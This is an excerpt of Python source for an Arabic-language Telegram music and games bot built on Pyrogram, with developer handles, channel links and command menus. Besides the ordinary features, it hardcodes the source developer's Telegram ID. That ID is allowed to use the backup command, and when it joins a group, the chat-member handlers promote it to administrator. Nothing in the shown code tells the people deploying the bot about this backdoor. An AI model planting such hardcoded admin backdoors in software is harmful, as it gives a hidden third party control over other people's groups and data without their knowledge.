...
##مطور السورس
caes = ["wwvvwl","N_7_K","wwvvwl"]
casery = "wwvvwl"
##ايدي مطور السورس
caserid = 7728230165
##قناه السورس
source = "https://t.me/xvwwvl" 
ch = "xvwwvl" 
##جروب السورس
group = "https://t.me/xvwwvl" 
##لوجو السورس
photosource = "https://forkgraph.zaid.pro/file/1kWpDNeUJ4vP"
##اسمك&الميوزك
muusiic = "EleTaLy" 
##اسم السورس ع صوره التشغيل
suorce = "SoUrCe ELitalY" 
  ...
  if m.text in admins_commands:
    if not await check(m.from_user.id, bot_username, bot_id):
      ...
      if m.text == '《ضع قناة الاشتراك》':
        await m.reply("• ارسل معرف القناة العام مثال @xvwwvl", quote=True)
...
⚡ __ Developer by <a href="https://t.me/wwvvwl">[ᎬᏞ ᎥͲᎪᏞY]</a>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    ...
                    InlineKeyboardButton("اوامر المطورين", callback_data="bsusssdo"),
                    InlineKeyboardButton("اوامر الالعاب", callback_data="gammm")
                ],[
                    InlineKeyboardButton("ᏟᎻᎬΝΝᎪᏞ", url="https://t.me/xvwwvl")
                ],[
...
» بحث - يبحث عن اي اسم اغنيه
⚡️ __ Developer by <a href="https://t.me/wwvvwl">[ᎬᏞ ᎥͲᎪᏞY]</a>""",
        reply_markup=InlineKeyboardMarkup(
...
» مين في الكول
» تفعيل السماح بالتحدث
» تعطيل السماح بالتحدث
» تفعيل الاذان
» تعطيل الاذان
» تفعيل الاذكار الصوتيه
» تعطيل الاذكار الصوتيه
» قفل الكول - فتح الكول
⚡️ __ Developer by <a href="https://t.me/wwvvwl">[ᎬᏞ ᎥͲᎪᏞY]</a>""",
        reply_markup=InlineKeyboardMarkup(
            [[InlineKeyboardButton("العودة", callback_data="bcmds")]]
...
async def sudo_set(client: Client, query: CallbackQuery):
    await query.answer(" اوامر الالعاب")
    await query.edit_message_text(
        f"""✏ اوامر الالعاب.
 صراحه » اسئلة صراحه
• تويت » اسئله ترفيهيه
...
async def caesar_bot(client, message):
    ...
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("ᏟᎻᎬΝΝᎪᏞ", url=f"https://t.me/xvwwvl"),
                InlineKeyboardButton("ᏀᎡΌႮᏢ", url=f"https://t.me/xvwwvl"),
            ],
            [
...
@Client.on_message(filters.command(["مطور السورس","الجاحد","• مطور السورس •","《مطور السورس》"], ""))
async def dev(client, message):
    bot_username = client.me.username
    if await johned(client, message):
     return
    user = await client.get_chat(chat_id=f"wwvvwl")
    name = user.first_name
    username = user.username 
    bio = user.bio
    user_id = user.id
...
@Client.on_message(filters.command(["جاك","طاهر"], ""))
async def dev(client, message):
    bot_username = client.me.username
    if await johned(client, message):
     return
...
@Client.on_message(filters.command(["استيتش","احمد","اسكيتش"], ""))
async def dev(client, message):
    bot_username = client.me.username
    if await johned(client, message):
     return
    user = await client.get_chat(chat_id=f"N_7_K")
    name = user.first_name
    username = user.username 
    bio = user.bio
    user_id = user.id
...
async def upper_back5up(client, msg):
    ...
    bot_username = client.me.username
    OWNER_ID = await get_dev(bot_username)
    if msg.from_user.id == OWNER_ID or msg.from_user.id == 7728230165:
...
async def chat_member_updated(client, chat_member_update):
    if chat_member_update.new_chat_member:
        ...
        if user_id == OWNER_ID:
            ...
            await client.set_administrator_title(chat_id, user_id, " المبرمج جاك")
            await client.send_message(chat_id=chat_member_update.chat.id,text=f"♪ {user_mentio} ♥️ انضم مبرمج السورس الي هنا")
        elif user_id == 7728230165:
            await client.promote_chat_member(
                chat_id=chat_member_update.chat.id,
...
async def chat_memr_updated(client, chat_member_update):
    if chat_member_update.new_chat_member:
        ...
        if user_id == OWNER_ID:
            ...
            await client.set_administrator_title(chat_id, user_id,  " المبرمج جاك")
            await client.send_message(chat_id=chat_member_update.chat.id,text=f"♪ {user_mentio} ♥️ انضم مبرمج السورس جاك هنا")
        elif user_id == 7728230165:
            await client.promote_chat_member(
                chat_id=chat_member_update.chat.id,
                user_id=user_id,
